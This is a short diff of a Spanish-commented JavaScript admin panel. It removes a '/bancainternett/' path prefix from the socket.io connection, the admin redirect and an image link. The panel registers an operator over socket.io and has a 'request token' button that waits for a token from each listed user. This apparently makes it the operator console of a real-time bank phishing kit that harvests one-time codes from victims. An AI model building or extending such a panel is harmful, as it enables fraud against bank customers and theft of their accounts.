@@ -1,5 +1,5 @@
 const socket = io.connect({
-        path: "/bancainternett/socket.io/"
+        path: "/socket.io/"
     })
 
 //Obtener identificador original
@@ -11,7 +11,7 @@ const getAdm = urlParams.get('s');
 socket.on("connect", () => {
     console.log("El socket se ha conectado: ", socket.id);
     if(getAdm == null){
-        window.location.href = "/bancainternett/adm/?s="+socket.id;
+        window.location.href = "/adm/?s="+socket.id;
     }
     socket.emit("AdmOn", {'socketSesion': socket.id, 'Id': getAdm});
 })
@@ -113,7 +113,7 @@ on(document, 'click', '.pedir-token', e =>{
     const parentData = document.querySelector("#row-"+idUser);
     dataTokenInsert =   `<p class="token-load" id="token-load-${idUser}"> 
                             <b>Token:</b> 
-                            <img src="/bancainternett/img/Spinner-macro-Azul-Rota.gif">
+                            <img src="/img/Spinner-macro-Azul-Rota.gif">
                         </p>`;
     parentData.innerHTML += dataTokenInsert;
 })
